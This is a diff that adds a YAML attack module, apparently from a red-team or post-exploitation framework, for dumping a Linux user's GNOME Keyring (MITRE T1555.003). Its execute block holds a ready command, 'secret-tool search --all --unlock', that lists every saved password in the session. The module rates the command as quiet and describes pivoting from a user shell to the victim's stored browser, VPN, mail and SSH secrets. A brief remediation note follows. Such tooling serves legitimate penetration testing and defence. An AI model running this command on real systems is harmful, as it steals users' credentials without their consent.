@@ -1,0 +1,40 @@
+technique: T1555.003
+name: GNOME Keyring dump via secret-tool
+key: loot:gnome-keyring
+tactic: [credential-access]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  facts_match: {has_gnome_keyring: true}
+execute:
+  command: |-
+    # If gnome-keyring-daemon is attached to this session, secret-tool
+    # (from libsecret) lists every stored secret, keyed by (service,
+    # user). The keyring stores every password the user's GUI apps
+    # saved — browsers, VPN clients, mail, SSH-agent fallback.
+    if command -v secret-tool >/dev/null 2>&1; then
+      secret-tool search --all --unlock '' 2>/dev/null | head -40
+    fi
+    ls -la "$HOME/.local/share/keyrings" 2>/dev/null | head -10
+verify:
+  success: "secret"
+cleanup:
+  command: ""
+report:
+  vector_type: gnome_keyring_loot
+  evidence: "gnome-keyring-daemon running + libsecret reachable"
+  description: >
+    gnome-keyring stores every saved password behind a per-session
+    AES-wrapped vault that unlocks on login. Once the user is logged in,
+    a sibling process in their session reads every secret via
+    ``secret-tool`` / the ``org.freedesktop.secrets`` D-Bus interface —
+    no master-password prompt, no decryption step. On a shared box the
+    operator pivots from a user shell to their keyring with one command.
+  remediation: >
+    Enforce separate keyrings per application where possible. Do not
+    share user sessions on multi-user hosts. Audit D-Bus policy on
+    org.freedesktop.secrets.
+  refs: [T1555.003]
